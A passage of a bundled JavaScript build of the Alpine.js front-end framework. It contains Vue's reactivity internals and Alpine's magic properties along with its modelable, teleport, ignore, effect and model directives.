    // INTERNAL
    setStyles,
    // INTERNAL
    mutateDom,
    directive,
    entangle,
    throttle,
    debounce,
    evaluate,
    initTree,
    nextTick,
    prefixed: prefix,
    prefix: setPrefix,
    plugin,
    magic,
    store,
    start,
    clone,
    // INTERNAL
    cloneNode,
    // INTERNAL
    bound: getBinding,
    $data: scope,
    watch,
    walk,
    data,
    bind: bind2
};
var alpine_default = Alpine;
// node_modules/@vue/shared/dist/shared.esm-bundler.js
function makeMap(str, expectsLowerCase) {
    const map = /* @__PURE__ */ Object.create(null);
    const list = str.split(",");
    for(let i = 0; i < list.length; i++)map[list[i]] = true;
    return expectsLowerCase ? (val)=>!!map[val.toLowerCase()] : (val)=>!!map[val];
}
var specialBooleanAttrs = `itemscope,allowfullscreen,formnovalidate,ismap,nomodule,novalidate,readonly`;
var isBooleanAttr2 = /* @__PURE__ */ makeMap(specialBooleanAttrs + `,async,autofocus,autoplay,controls,default,defer,disabled,hidden,loop,open,required,reversed,scoped,seamless,checked,muted,multiple,selected`);
var EMPTY_OBJ = Object.freeze({});
var EMPTY_ARR = Object.freeze([]);
var hasOwnProperty = Object.prototype.hasOwnProperty;
var hasOwn = (val, key)=>hasOwnProperty.call(val, key);
var isArray = Array.isArray;
var isMap = (val)=>toTypeString(val) === "[object Map]";
var isString = (val)=>typeof val === "string";
var isSymbol = (val)=>typeof val === "symbol";
var isObject = (val)=>val !== null && typeof val === "object";
var objectToString = Object.prototype.toString;
var toTypeString = (value)=>objectToString.call(value);
var toRawType = (value)=>{
    return toTypeString(value).slice(8, -1);
};
var isIntegerKey = (key)=>isString(key) && key !== "NaN" && key[0] !== "-" && "" + parseInt(key, 10) === key;
var cacheStringFunction = (fn)=>{
    const cache = /* @__PURE__ */ Object.create(null);
    return (str)=>{
        const hit = cache[str];
        return hit || (cache[str] = fn(str));
    };
};
var camelizeRE = /-(\w)/g;
var camelize = cacheStringFunction((str)=>{
    return str.replace(camelizeRE, (_, c)=>c ? c.toUpperCase() : "");
});
var hyphenateRE = /\B([A-Z])/g;
var hyphenate = cacheStringFunction((str)=>str.replace(hyphenateRE, "-$1").toLowerCase());
var capitalize = cacheStringFunction((str)=>str.charAt(0).toUpperCase() + str.slice(1));
var toHandlerKey = cacheStringFunction((str)=>str ? `on${capitalize(str)}` : ``);
var hasChanged = (value, oldValue)=>value !== oldValue && (value === value || oldValue === oldValue);
// node_modules/@vue/reactivity/dist/reactivity.esm-bundler.js
var targetMap = /* @__PURE__ */ new WeakMap();
var effectStack = [];
var activeEffect;
var ITERATE_KEY = Symbol("iterate");
var MAP_KEY_ITERATE_KEY = Symbol("Map key iterate");
function isEffect(fn) {
    return fn && fn._isEffect === true;
}
function effect2(fn, options = EMPTY_OBJ) {
    if (isEffect(fn)) fn = fn.raw;
    const effect3 = createReactiveEffect(fn, options);
    if (!options.lazy) effect3();
    return effect3;
}
function stop(effect3) {
    if (effect3.active) {
        cleanup(effect3);
        if (effect3.options.onStop) effect3.options.onStop();
        effect3.active = false;
    }
}
var uid = 0;
function createReactiveEffect(fn, options) {
    const effect3 = function reactiveEffect() {
        if (!effect3.active) return fn();
        if (!effectStack.includes(effect3)) {
            cleanup(effect3);
            try {
                enableTracking();
                effectStack.push(effect3);
                activeEffect = effect3;
                return fn();
            } finally{
                effectStack.pop();
                resetTracking();
                activeEffect = effectStack[effectStack.length - 1];
            }
        }
    };
    effect3.id = uid++;
    effect3.allowRecurse = !!options.allowRecurse;
    effect3._isEffect = true;
    effect3.active = true;
    effect3.raw = fn;
    effect3.deps = [];
    effect3.options = options;
    return effect3;
}
function cleanup(effect3) {
    const { deps } = effect3;
    if (deps.length) {
        for(let i = 0; i < deps.length; i++)deps[i].delete(effect3);
        deps.length = 0;
    }
}
var shouldTrack = true;
var trackStack = [];
function pauseTracking() {
    trackStack.push(shouldTrack);
    shouldTrack = false;
}
function enableTracking() {
    trackStack.push(shouldTrack);
    shouldTrack = true;
}
function resetTracking() {
    const last = trackStack.pop();
    shouldTrack = last === void 0 ? true : last;
}
function track(target, type, key) {
    if (!shouldTrack || activeEffect === void 0) return;
    let depsMap = targetMap.get(target);
    if (!depsMap) targetMap.set(target, depsMap = /* @__PURE__ */ new Map());
    let dep = depsMap.get(key);
    if (!dep) depsMap.set(key, dep = /* @__PURE__ */ new Set());
    if (!dep.has(activeEffect)) {
        dep.add(activeEffect);
        activeEffect.deps.push(dep);
        if (activeEffect.options.onTrack) activeEffect.options.onTrack({
            effect: activeEffect,
            target,
            type,
            key
        });
    }
}
function trigger(target, type, key, newValue, oldValue, oldTarget) {
    const depsMap = targetMap.get(target);
    if (!depsMap) return;
    const effects = /* @__PURE__ */ new Set();
    const add2 = (effectsToAdd)=>{
        if (effectsToAdd) effectsToAdd.forEach((effect3)=>{
            if (effect3 !== activeEffect || effect3.allowRecurse) effects.add(effect3);
        });
    };
    if (type === "clear") depsMap.forEach(add2);
    else if (key === "length" && isArray(target)) depsMap.forEach((dep, key2)=>{
        if (key2 === "length" || key2 >= newValue) add2(dep);
    });
    else {
        if (key !== void 0) add2(depsMap.get(key));
        switch(type){
            case "add":
                if (!isArray(target)) {
                    add2(depsMap.get(ITERATE_KEY));
                    if (isMap(target)) add2(depsMap.get(MAP_KEY_ITERATE_KEY));
                } else if (isIntegerKey(key)) add2(depsMap.get("length"));
                break;
            case "delete":
                if (!isArray(target)) {
                    add2(depsMap.get(ITERATE_KEY));
                    if (isMap(target)) add2(depsMap.get(MAP_KEY_ITERATE_KEY));
                }
                break;
            case "set":
                if (isMap(target)) add2(depsMap.get(ITERATE_KEY));
                break;
        }
    }
    const run = (effect3)=>{
        if (effect3.options.onTrigger) effect3.options.onTrigger({
            effect: effect3,
            target,
            key,
            type,
            newValue,
            oldValue,
            oldTarget
        });
        if (effect3.options.scheduler) effect3.options.scheduler(effect3);
        else effect3();
    };
    effects.forEach(run);
}
var isNonTrackableKeys = /* @__PURE__ */ makeMap(`__proto__,__v_isRef,__isVue`);
var builtInSymbols = new Set(Object.getOwnPropertyNames(Symbol).map((key)=>Symbol[key]).filter(isSymbol));
var get2 = /* @__PURE__ */ createGetter();
var readonlyGet = /* @__PURE__ */ createGetter(true);
var arrayInstrumentations = /* @__PURE__ */ createArrayInstrumentations();
function createArrayInstrumentations() {
    const instrumentations = {};
    [
        "includes",
        "indexOf",
        "lastIndexOf"
    ].forEach((key)=>{
        instrumentations[key] = function(...args) {
            const arr = toRaw(this);
            for(let i = 0, l = this.length; i < l; i++)track(arr, "get", i + "");
            const res = arr[key](...args);
            if (res === -1 || res === false) return arr[key](...args.map(toRaw));
            else return res;
        };
    });
    [
        "push",
        "pop",
        "shift",
        "unshift",
        "splice"
    ].forEach((key)=>{
        instrumentations[key] = function(...args) {
            pauseTracking();
            const res = toRaw(this)[key].apply(this, args);
            resetTracking();
            return res;
        };
    });
    return instrumentations;
}
function createGetter(isReadonly = false, shallow = false) {
    return function get3(target, key, receiver) {
        if (key === "__v_isReactive") return !isReadonly;
        else if (key === "__v_isReadonly") return isReadonly;
        else if (key === "__v_raw" && receiver === (isReadonly ? shallow ? shallowReadonlyMap : readonlyMap : shallow ? shallowReactiveMap : reactiveMap).get(target)) return target;
        const targetIsArray = isArray(target);
        if (!isReadonly && targetIsArray && hasOwn(arrayInstrumentations, key)) return Reflect.get(arrayInstrumentations, key, receiver);
        const res = Reflect.get(target, key, receiver);
        if (isSymbol(key) ? builtInSymbols.has(key) : isNonTrackableKeys(key)) return res;
        if (!isReadonly) track(target, "get", key);
        if (shallow) return res;
        if (isRef(res)) {
            const shouldUnwrap = !targetIsArray || !isIntegerKey(key);
            return shouldUnwrap ? res.value : res;
        }
        if (isObject(res)) return isReadonly ? readonly(res) : reactive2(res);
        return res;
    };
}
var set2 = /* @__PURE__ */ createSetter();
function createSetter(shallow = false) {
    return function set3(target, key, value, receiver) {
        let oldValue = target[key];
        if (!shallow) {
            value = toRaw(value);
            oldValue = toRaw(oldValue);
            if (!isArray(target) && isRef(oldValue) && !isRef(value)) {
                oldValue.value = value;
                return true;
            }
        }
        const hadKey = isArray(target) && isIntegerKey(key) ? Number(key) < target.length : hasOwn(target, key);
        const result = Reflect.set(target, key, value, receiver);
        if (target === toRaw(receiver)) {
            if (!hadKey) trigger(target, "add", key, value);
            else if (hasChanged(value, oldValue)) trigger(target, "set", key, value, oldValue);
        }
        return result;
    };
}
function deleteProperty(target, key) {
    const hadKey = hasOwn(target, key);
    const oldValue = target[key];
    const result = Reflect.deleteProperty(target, key);
    if (result && hadKey) trigger(target, "delete", key, void 0, oldValue);
    return result;
}
function has(target, key) {
    const result = Reflect.has(target, key);
    if (!isSymbol(key) || !builtInSymbols.has(key)) track(target, "has", key);
    return result;
}
function ownKeys(target) {
    track(target, "iterate", isArray(target) ? "length" : ITERATE_KEY);
    return Reflect.ownKeys(target);
}
var mutableHandlers = {
    get: get2,
    set: set2,
    deleteProperty,
    has,
    ownKeys
};
var readonlyHandlers = {
    get: readonlyGet,
    set (target, key) {
        console.warn(`Set operation on key "${String(key)}" failed: target is readonly.`, target);
        return true;
    },
    deleteProperty (target, key) {
        console.warn(`Delete operation on key "${String(key)}" failed: target is readonly.`, target);
        return true;
    }
};
var toReactive = (value)=>isObject(value) ? reactive2(value) : value;
var toReadonly = (value)=>isObject(value) ? readonly(value) : value;
var toShallow = (value)=>value;
var getProto = (v)=>Reflect.getPrototypeOf(v);
function get$1(target, key, isReadonly = false, isShallow = false) {
    target = target["__v_raw"];
    const rawTarget = toRaw(target);
    const rawKey = toRaw(key);
    if (key !== rawKey) !isReadonly && track(rawTarget, "get", key);
    !isReadonly && track(rawTarget, "get", rawKey);
    const { has: has2 } = getProto(rawTarget);
    const wrap = isShallow ? toShallow : isReadonly ? toReadonly : toReactive;
    if (has2.call(rawTarget, key)) return wrap(target.get(key));
    else if (has2.call(rawTarget, rawKey)) return wrap(target.get(rawKey));
    else if (target !== rawTarget) target.get(key);
}
function has$1(key, isReadonly = false) {
    const target = this["__v_raw"];
    const rawTarget = toRaw(target);
    const rawKey = toRaw(key);
    if (key !== rawKey) !isReadonly && track(rawTarget, "has", key);
    !isReadonly && track(rawTarget, "has", rawKey);
    return key === rawKey ? target.has(key) : target.has(key) || target.has(rawKey);
}
function size(target, isReadonly = false) {
    target = target["__v_raw"];
    !isReadonly && track(toRaw(target), "iterate", ITERATE_KEY);
    return Reflect.get(target, "size", target);
}
function add(value) {
    value = toRaw(value);
    const target = toRaw(this);
    const proto = getProto(target);
    const hadKey = proto.has.call(target, value);
    if (!hadKey) {
        target.add(value);
        trigger(target, "add", value, value);
    }
    return this;
}
function set$1(key, value) {
    value = toRaw(value);
    const target = toRaw(this);
    const { has: has2, get: get3 } = getProto(target);
    let hadKey = has2.call(target, key);
    if (!hadKey) {
        key = toRaw(key);
        hadKey = has2.call(target, key);
    } else checkIdentityKeys(target, has2, key);
    const oldValue = get3.call(target, key);
    target.set(key, value);
    if (!hadKey) trigger(target, "add", key, value);
    else if (hasChanged(value, oldValue)) trigger(target, "set", key, value, oldValue);
    return this;
}
function deleteEntry(key) {
    const target = toRaw(this);
    const { has: has2, get: get3 } = getProto(target);
    let hadKey = has2.call(target, key);
    if (!hadKey) {
        key = toRaw(key);
        hadKey = has2.call(target, key);
    } else checkIdentityKeys(target, has2, key);
    const oldValue = get3 ? get3.call(target, key) : void 0;
    const result = target.delete(key);
    if (hadKey) trigger(target, "delete", key, void 0, oldValue);
    return result;
}
function clear() {
    const target = toRaw(this);
    const hadItems = target.size !== 0;
    const oldTarget = isMap(target) ? new Map(target) : new Set(target);
    const result = target.clear();
    if (hadItems) trigger(target, "clear", void 0, void 0, oldTarget);
    return result;
}
function createForEach(isReadonly, isShallow) {
    return function forEach(callback, thisArg) {
        const observed = this;
        const target = observed["__v_raw"];
        const rawTarget = toRaw(target);
        const wrap = isShallow ? toShallow : isReadonly ? toReadonly : toReactive;
        !isReadonly && track(rawTarget, "iterate", ITERATE_KEY);
        return target.forEach((value, key)=>{
            return callback.call(thisArg, wrap(value), wrap(key), observed);
        });
    };
}
function createIterableMethod(method, isReadonly, isShallow) {
    return function(...args) {
        const target = this["__v_raw"];
        const rawTarget = toRaw(target);
        const targetIsMap = isMap(rawTarget);
        const isPair = method === "entries" || method === Symbol.iterator && targetIsMap;
        const isKeyOnly = method === "keys" && targetIsMap;
        const innerIterator = target[method](...args);
        const wrap = isShallow ? toShallow : isReadonly ? toReadonly : toReactive;
        !isReadonly && track(rawTarget, "iterate", isKeyOnly ? MAP_KEY_ITERATE_KEY : ITERATE_KEY);
        return {
            // iterator protocol
            next () {
                const { value, done } = innerIterator.next();
                return done ? {
                    value,
                    done
                } : {
                    value: isPair ? [
                        wrap(value[0]),
                        wrap(value[1])
                    ] : wrap(value),
                    done
                };
            },
            // iterable protocol
            [Symbol.iterator] () {
                return this;
            }
        };
    };
}
function createReadonlyMethod(type) {
    return function(...args) {
        {
            const key = args[0] ? `on key "${args[0]}" ` : ``;
            console.warn(`${capitalize(type)} operation ${key}failed: target is readonly.`, toRaw(this));
        }
        return type === "delete" ? false : this;
    };
}
function createInstrumentations() {
    const mutableInstrumentations2 = {
        get (key) {
            return get$1(this, key);
        },
        get size () {
            return size(this);
        },
        has: has$1,
        add,
        set: set$1,
        delete: deleteEntry,
        clear,
        forEach: createForEach(false, false)
    };
    const shallowInstrumentations2 = {
        get (key) {
            return get$1(this, key, false, true);
        },
        get size () {
            return size(this);
        },
        has: has$1,
        add,
        set: set$1,
        delete: deleteEntry,
        clear,
        forEach: createForEach(false, true)
    };
    const readonlyInstrumentations2 = {
        get (key) {
            return get$1(this, key, true);
        },
        get size () {
            return size(this, true);
        },
        has (key) {
            return has$1.call(this, key, true);
        },
        add: createReadonlyMethod("add"),
        set: createReadonlyMethod("set"),
        delete: createReadonlyMethod("delete"),
        clear: createReadonlyMethod("clear"),
        forEach: createForEach(true, false)
    };
    const shallowReadonlyInstrumentations2 = {
        get (key) {
            return get$1(this, key, true, true);
        },
        get size () {
            return size(this, true);
        },
        has (key) {
            return has$1.call(this, key, true);
        },
        add: createReadonlyMethod("add"),
        set: createReadonlyMethod("set"),
        delete: createReadonlyMethod("delete"),
        clear: createReadonlyMethod("clear"),
        forEach: createForEach(true, true)
    };
    const iteratorMethods = [
        "keys",
        "values",
        "entries",
        Symbol.iterator
    ];
    iteratorMethods.forEach((method)=>{
        mutableInstrumentations2[method] = createIterableMethod(method, false, false);
        readonlyInstrumentations2[method] = createIterableMethod(method, true, false);
        shallowInstrumentations2[method] = createIterableMethod(method, false, true);
        shallowReadonlyInstrumentations2[method] = createIterableMethod(method, true, true);
    });
    return [
        mutableInstrumentations2,
        readonlyInstrumentations2,
        shallowInstrumentations2,
        shallowReadonlyInstrumentations2
    ];
}
var [mutableInstrumentations, readonlyInstrumentations, shallowInstrumentations, shallowReadonlyInstrumentations] = /* @__PURE__ */ createInstrumentations();
function createInstrumentationGetter(isReadonly, shallow) {
    const instrumentations = shallow ? isReadonly ? shallowReadonlyInstrumentations : shallowInstrumentations : isReadonly ? readonlyInstrumentations : mutableInstrumentations;
    return (target, key, receiver)=>{
        if (key === "__v_isReactive") return !isReadonly;
        else if (key === "__v_isReadonly") return isReadonly;
        else if (key === "__v_raw") return target;
        return Reflect.get(hasOwn(instrumentations, key) && key in target ? instrumentations : target, key, receiver);
    };
}
var mutableCollectionHandlers = {
    get: /* @__PURE__ */ createInstrumentationGetter(false, false)
};
var readonlyCollectionHandlers = {
    get: /* @__PURE__ */ createInstrumentationGetter(true, false)
};
function checkIdentityKeys(target, has2, key) {
    const rawKey = toRaw(key);
    if (rawKey !== key && has2.call(target, rawKey)) {
        const type = toRawType(target);
        console.warn(`Reactive ${type} contains both the raw and reactive versions of the same object${type === `Map` ? ` as keys` : ``}, which can lead to inconsistencies. Avoid differentiating between the raw and reactive versions of an object and only use the reactive version if possible.`);
    }
}
var reactiveMap = /* @__PURE__ */ new WeakMap();
var shallowReactiveMap = /* @__PURE__ */ new WeakMap();
var readonlyMap = /* @__PURE__ */ new WeakMap();
var shallowReadonlyMap = /* @__PURE__ */ new WeakMap();
function targetTypeMap(rawType) {
    switch(rawType){
        case "Object":
        case "Array":
            return 1;
        case "Map":
        case "Set":
        case "WeakMap":
        case "WeakSet":
            return 2;
        default:
            return 0;
    }
}
function getTargetType(value) {
    return value["__v_skip"] || !Object.isExtensible(value) ? 0 : targetTypeMap(toRawType(value));
}
function reactive2(target) {
    if (target && target["__v_isReadonly"]) return target;
    return createReactiveObject(target, false, mutableHandlers, mutableCollectionHandlers, reactiveMap);
}
function readonly(target) {
    return createReactiveObject(target, true, readonlyHandlers, readonlyCollectionHandlers, readonlyMap);
}
function createReactiveObject(target, isReadonly, baseHandlers, collectionHandlers, proxyMap) {
    if (!isObject(target)) {
        console.warn(`value cannot be made reactive: ${String(target)}`);
        return target;
    }
    if (target["__v_raw"] && !(isReadonly && target["__v_isReactive"])) return target;
    const existingProxy = proxyMap.get(target);
    if (existingProxy) return existingProxy;
    const targetType = getTargetType(target);
    if (targetType === 0) return target;
    const proxy = new Proxy(target, targetType === 2 ? collectionHandlers : baseHandlers);
    proxyMap.set(target, proxy);
    return proxy;
}
function toRaw(observed) {
    return observed && toRaw(observed["__v_raw"]) || observed;
}
function isRef(r) {
    return Boolean(r && r.__v_isRef === true);
}
// packages/alpinejs/src/magics/$nextTick.js
magic("nextTick", ()=>nextTick);
// packages/alpinejs/src/magics/$dispatch.js
magic("dispatch", (el)=>dispatch.bind(dispatch, el));
// packages/alpinejs/src/magics/$watch.js
magic("watch", (el, { evaluateLater: evaluateLater2, cleanup: cleanup2 })=>(key, callback)=>{
        let evaluate2 = evaluateLater2(key);
        let getter = ()=>{
            let value;
            evaluate2((i)=>value = i);
            return value;
        };
        let unwatch = watch(getter, callback);
        cleanup2(unwatch);
    });
// packages/alpinejs/src/magics/$store.js
magic("store", getStores);
// packages/alpinejs/src/magics/$data.js
magic("data", (el)=>scope(el));
// packages/alpinejs/src/magics/$root.js
magic("root", (el)=>closestRoot(el));
// packages/alpinejs/src/magics/$refs.js
magic("refs", (el)=>{
    if (el._x_refs_proxy) return el._x_refs_proxy;
    el._x_refs_proxy = mergeProxies(getArrayOfRefObject(el));
    return el._x_refs_proxy;
});
function getArrayOfRefObject(el) {
    let refObjects = [];
    findClosest(el, (i)=>{
        if (i._x_refs) refObjects.push(i._x_refs);
    });
    return refObjects;
}
// packages/alpinejs/src/ids.js
var globalIdMemo = {};
function findAndIncrementId(name) {
    if (!globalIdMemo[name]) globalIdMemo[name] = 0;
    return ++globalIdMemo[name];
}
function closestIdRoot(el, name) {
    return findClosest(el, (element)=>{
        if (element._x_ids && element._x_ids[name]) return true;
    });
}
function setIdRoot(el, name) {
    if (!el._x_ids) el._x_ids = {};
    if (!el._x_ids[name]) el._x_ids[name] = findAndIncrementId(name);
}
// packages/alpinejs/src/magics/$id.js
magic("id", (el, { cleanup: cleanup2 })=>(name, key = null)=>{
        let cacheKey = `${name}${key ? `-${key}` : ""}`;
        return cacheIdByNameOnElement(el, cacheKey, cleanup2, ()=>{
            let root = closestIdRoot(el, name);
            let id = root ? root._x_ids[name] : findAndIncrementId(name);
            return key ? `${name}-${id}-${key}` : `${name}-${id}`;
        });
    });
interceptClone((from, to)=>{
    if (from._x_id) to._x_id = from._x_id;
});
function cacheIdByNameOnElement(el, cacheKey, cleanup2, callback) {
    if (!el._x_id) el._x_id = {};
    if (el._x_id[cacheKey]) return el._x_id[cacheKey];
    let output = callback();
    el._x_id[cacheKey] = output;
    cleanup2(()=>{
        delete el._x_id[cacheKey];
    });
    return output;
}
// packages/alpinejs/src/magics/$el.js
magic("el", (el)=>el);
// packages/alpinejs/src/magics/index.js
warnMissingPluginMagic("Focus", "focus", "focus");
warnMissingPluginMagic("Persist", "persist", "persist");
function warnMissingPluginMagic(name, magicName, slug) {
    magic(magicName, (el)=>warn(`You can't use [$${magicName}] without first installing the "${name}" plugin here: https://alpinejs.dev/plugins/${slug}`, el));
}
// packages/alpinejs/src/directives/x-modelable.js
directive("modelable", (el, { expression }, { effect: effect3, evaluateLater: evaluateLater2, cleanup: cleanup2 })=>{
    let func = evaluateLater2(expression);
    let innerGet = ()=>{
        let result;
        func((i)=>result = i);
        return result;
    };
    let evaluateInnerSet = evaluateLater2(`${expression} = __placeholder`);
    let innerSet = (val)=>evaluateInnerSet(()=>{}, {
            scope: {
                "__placeholder": val
            }
        });
    let initialValue = innerGet();
    innerSet(initialValue);
    queueMicrotask(()=>{
        if (!el._x_model) return;
        el._x_removeModelListeners["default"]();
        let outerGet = el._x_model.get;
        let outerSet = el._x_model.set;
        let releaseEntanglement = entangle({
            get () {
                return outerGet();
            },
            set (value) {
                outerSet(value);
            }
        }, {
            get () {
                return innerGet();
            },
            set (value) {
                innerSet(value);
            }
        });
        cleanup2(releaseEntanglement);
    });
});
// packages/alpinejs/src/directives/x-teleport.js
directive("teleport", (el, { modifiers, expression }, { cleanup: cleanup2 })=>{
    if (el.tagName.toLowerCase() !== "template") warn("x-teleport can only be used on a <template> tag", el);
    let target = getTarget(expression);
    let clone2 = el.content.cloneNode(true).firstElementChild;
    el._x_teleport = clone2;
    clone2._x_teleportBack = el;
    el.setAttribute("data-teleport-template", true);
    clone2.setAttribute("data-teleport-target", true);
    if (el._x_forwardEvents) el._x_forwardEvents.forEach((eventName)=>{
        clone2.addEventListener(eventName, (e)=>{
            e.stopPropagation();
            el.dispatchEvent(new e.constructor(e.type, e));
        });
    });
    addScopeToNode(clone2, {}, el);
    let placeInDom = (clone3, target2, modifiers2)=>{
        if (modifiers2.includes("prepend")) target2.parentNode.insertBefore(clone3, target2);
        else if (modifiers2.includes("append")) target2.parentNode.insertBefore(clone3, target2.nextSibling);
        else target2.appendChild(clone3);
    };
    mutateDom(()=>{
        placeInDom(clone2, target, modifiers);
        skipDuringClone(()=>{
            initTree(clone2);
            clone2._x_ignore = true;
        })();
    });
    el._x_teleportPutBack = ()=>{
        let target2 = getTarget(expression);
        mutateDom(()=>{
            placeInDom(el._x_teleport, target2, modifiers);
        });
    };
    cleanup2(()=>mutateDom(()=>{
            clone2.remove();
            destroyTree(clone2);
        }));
});
var teleportContainerDuringClone = document.createElement("div");
function getTarget(expression) {
    let target = skipDuringClone(()=>{
        return document.querySelector(expression);
    }, ()=>{
        return teleportContainerDuringClone;
    })();
    if (!target) warn(`Cannot find x-teleport element for selector: "${expression}"`);
    return target;
}
// packages/alpinejs/src/directives/x-ignore.js
var handler = ()=>{};
handler.inline = (el, { modifiers }, { cleanup: cleanup2 })=>{
    modifiers.includes("self") ? el._x_ignoreSelf = true : el._x_ignore = true;
    cleanup2(()=>{
        modifiers.includes("self") ? delete el._x_ignoreSelf : delete el._x_ignore;
    });
};
directive("ignore", handler);
// packages/alpinejs/src/directives/x-effect.js
directive("effect", skipDuringClone((el, { expression }, { effect: effect3 })=>{
    effect3(evaluateLater(el, expression));
}));
// packages/alpinejs/src/utils/on.js
function on(el, event, modifiers, callback) {
    let listenerTarget = el;
    let handler4 = (e)=>callback(e);
    let options = {};
    let wrapHandler = (callback2, wrapper)=>(e)=>wrapper(callback2, e);
    if (modifiers.includes("dot")) event = dotSyntax(event);
    if (modifiers.includes("camel")) event = camelCase2(event);
    if (modifiers.includes("passive")) options.passive = true;
    if (modifiers.includes("capture")) options.capture = true;
    if (modifiers.includes("window")) listenerTarget = window;
    if (modifiers.includes("document")) listenerTarget = document;
    if (modifiers.includes("debounce")) {
        let nextModifier = modifiers[modifiers.indexOf("debounce") + 1] || "invalid-wait";
        let wait = isNumeric(nextModifier.split("ms")[0]) ? Number(nextModifier.split("ms")[0]) : 250;
        handler4 = debounce(handler4, wait);
    }
    if (modifiers.includes("throttle")) {
        let nextModifier = modifiers[modifiers.indexOf("throttle") + 1] || "invalid-wait";
        let wait = isNumeric(nextModifier.split("ms")[0]) ? Number(nextModifier.split("ms")[0]) : 250;
        handler4 = throttle(handler4, wait);
    }
    if (modifiers.includes("prevent")) handler4 = wrapHandler(handler4, (next, e)=>{
        e.preventDefault();
        next(e);
    });
    if (modifiers.includes("stop")) handler4 = wrapHandler(handler4, (next, e)=>{
        e.stopPropagation();
        next(e);
    });
    if (modifiers.includes("once")) handler4 = wrapHandler(handler4, (next, e)=>{
        next(e);
        listenerTarget.removeEventListener(event, handler4, options);
    });
    if (modifiers.includes("away") || modifiers.includes("outside")) {
        listenerTarget = document;
        handler4 = wrapHandler(handler4, (next, e)=>{
            if (el.contains(e.target)) return;
            if (e.target.isConnected === false) return;
            if (el.offsetWidth < 1 && el.offsetHeight < 1) return;
            if (el._x_isShown === false) return;
            next(e);
        });
    }
    if (modifiers.includes("self")) handler4 = wrapHandler(handler4, (next, e)=>{
        e.target === el && next(e);
    });
    if (isKeyEvent(event) || isClickEvent(event)) handler4 = wrapHandler(handler4, (next, e)=>{
        if (isListeningForASpecificKeyThatHasntBeenPressed(e, modifiers)) return;
        next(e);
    });
    listenerTarget.addEventListener(event, handler4, options);
    return ()=>{
        listenerTarget.removeEventListener(event, handler4, options);
    };
}
function dotSyntax(subject) {
    return subject.replace(/-/g, ".");
}
function camelCase2(subject) {
    return subject.toLowerCase().replace(/-(\w)/g, (match, char)=>char.toUpperCase());
}
function isNumeric(subject) {
    return !Array.isArray(subject) && !isNaN(subject);
}
function kebabCase2(subject) {
    if ([
        " ",
        "_"
    ].includes(subject)) return subject;
    return subject.replace(/([a-z])([A-Z])/g, "$1-$2").replace(/[_\s]/, "-").toLowerCase();
}
function isKeyEvent(event) {
    return [
        "keydown",
        "keyup"
    ].includes(event);
}
function isClickEvent(event) {
    return [
        "contextmenu",
        "click",
        "mouse"
    ].some((i)=>event.includes(i));
}
function isListeningForASpecificKeyThatHasntBeenPressed(e, modifiers) {
    let keyModifiers = modifiers.filter((i)=>{
        return ![
            "window",
            "document",
            "prevent",
            "stop",
            "once",
            "capture",
            "self",
            "away",
            "outside",
            "passive"
        ].includes(i);
    });
    if (keyModifiers.includes("debounce")) {
        let debounceIndex = keyModifiers.indexOf("debounce");
        keyModifiers.splice(debounceIndex, isNumeric((keyModifiers[debounceIndex + 1] || "invalid-wait").split("ms")[0]) ? 2 : 1);
    }
    if (keyModifiers.includes("throttle")) {
        let debounceIndex = keyModifiers.indexOf("throttle");
        keyModifiers.splice(debounceIndex, isNumeric((keyModifiers[debounceIndex + 1] || "invalid-wait").split("ms")[0]) ? 2 : 1);
    }
    if (keyModifiers.length === 0) return false;
    if (keyModifiers.length === 1 && keyToModifiers(e.key).includes(keyModifiers[0])) return false;
    const systemKeyModifiers = [
        "ctrl",
        "shift",
        "alt",
        "meta",
        "cmd",
        "super"
    ];
    const selectedSystemKeyModifiers = systemKeyModifiers.filter((modifier)=>keyModifiers.includes(modifier));
    keyModifiers = keyModifiers.filter((i)=>!selectedSystemKeyModifiers.includes(i));
    if (selectedSystemKeyModifiers.length > 0) {
        const activelyPressedKeyModifiers = selectedSystemKeyModifiers.filter((modifier)=>{
            if (modifier === "cmd" || modifier === "super") modifier = "meta";
            return e[`${modifier}Key`];
        });
        if (activelyPressedKeyModifiers.length === selectedSystemKeyModifiers.length) {
            if (isClickEvent(e.type)) return false;
            if (keyToModifiers(e.key).includes(keyModifiers[0])) return false;
        }
    }
    return true;
}
function keyToModifiers(key) {
    if (!key) return [];
    key = kebabCase2(key);
    let modifierToKeyMap = {
        "ctrl": "control",
        "slash": "/",
        "space": " ",
        "spacebar": " ",
        "cmd": "meta",
        "esc": "escape",
        "up": "arrow-up",
        "down": "arrow-down",
        "left": "arrow-left",
        "right": "arrow-right",
        "period": ".",
        "comma": ",",
        "equal": "=",
        "minus": "-",
        "underscore": "_"
    };
    modifierToKeyMap[key] = key;
    return Object.keys(modifierToKeyMap).map((modifier)=>{
        if (modifierToKeyMap[modifier] === key) return modifier;
    }).filter((modifier)=>modifier);
}
// packages/alpinejs/src/directives/x-model.js
directive("model", (el, { modifiers, expression }, { effect: effect3, cleanup: cleanup2 })=>{
    let scopeTarget = el;
    if (modifiers.includes("parent")) scopeTarget = el.parentNode;
    let evaluateGet = evaluateLater(scopeTarget, expression);
    let evaluateSet;
    if (typeof expression === "string") evaluateSet = evaluateLater(scopeTarget, `${expression} = __placeholder`);
    else if (typeof expression === "function" && typeof expression() === "string") evaluateSet = evaluateLater(scopeTarget, `${expression()} = __placeholder`);
    else evaluateSet = ()=>{};
    let getValue = ()=>{
        let result;
        evaluateGet((value)=>result = value);
        return isGetterSetter(result) ? result.get() : result;
    };
    let setValue = (value)=>{
        let result;
        evaluateGet((value2)=>result = value2);
        if (isGetterSetter(result)) result.set(value);
        else evaluateSet(()=>{}, {
            scope: {
                "__placeholder": value
            }
        });
    };
    if (typeof expression === "string" && el.type === "radio") mutateDom(()=>{
        if (!el.hasAttribute("name")) el.setAttribute("name", expression);
    });
    var event = el.tagName.toLowerCase() === "select" || [
        "checkbox",
        "radio"
    ].includes(el.type) || modifiers.includes("lazy") ? "change" : "input";
    let removeListener = isCloning ? ()=>{} : on(el, event, modifiers, (e)=>{
        setValue(getInputValue(el, modifiers, e, getValue()));
    });
    if (modifiers.includes("fill")) {
        if ([
            void 0,
            null,
            ""
        ].includes(getValue()) || isCheckbox(el) && Array.isArray(getValue()) || el.tagName.toLowerCase() === "select" && el.multiple) setValue(getInputValue(el, modifiers, {
            target: el
        }, getValue()));
    }
    if (!el._x_removeModelListeners) el._x_removeModelListeners = {};
    el._x_removeModelListeners["default"] = removeListener;
    cleanup2(()=>el._x_removeModelListeners["default"]());
    if (el.form) {
        let removeResetListener = on(el.form, "reset", [], (e)=>{
            nextTick(()=>el._x_model && el._x_model.set(getInputValue(el, modifiers, {
                    target: el
                }, getValue())));
        });
